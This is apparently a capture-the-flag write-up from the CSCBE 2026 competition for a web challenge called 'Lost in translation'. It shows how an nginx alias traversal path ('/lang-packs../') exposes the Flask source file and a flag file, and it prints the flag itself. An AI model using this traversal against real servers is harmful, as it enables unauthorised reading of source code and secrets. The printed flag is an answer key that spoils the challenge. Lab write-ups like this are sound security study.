Context:
CSCBE competition, 2026

Team:
Lars Declercq (solo)


Name:
Lost in translation

Category:
Web

Hints, info:
Medium

Welcome to Lost in Translation, the hottest new language learning platform! We've built a blazing-fast system to deliver vocabulary packs in Dutch, English, and French. Our cutting-edge architecture ensures lightning-speed content delivery straight to your browser.

Can you uncover the platform's hidden secrets?

Files: Instance

Write-up:
1. When accesing the site and exploring for a bit they make it clear that they use flask and nginx
2. I first checked for a robot.txt but it did not exist
3. I then decided to check for the json url getter `http://lost-in-translation.a91a87a956b5c5cd.challenge.zone:8080/lang-packs/en.json`
4. Nginx has a common security flaw called "Alias Traversal"
5. When accessing `/lang-packs../main.py` it downloads the main python file
```python
import os
from flask import Flask, render_template, jsonify, request

app = Flask(__name__)

# Internal configuration paths
FLAG_PATH = os.path.join(os.path.dirname(__file__), 'internal', 'config', 'flag.txt')


@app.route('/')
def index():
    return render_template('index.html')
#44 more lines
```
when traversing to  `/lang-packs../internal/config/flag.txt` the flag is in cleartext

Flag is: `CSC{2T11L_10s7_In_TR4n5L4710n_81uES}`
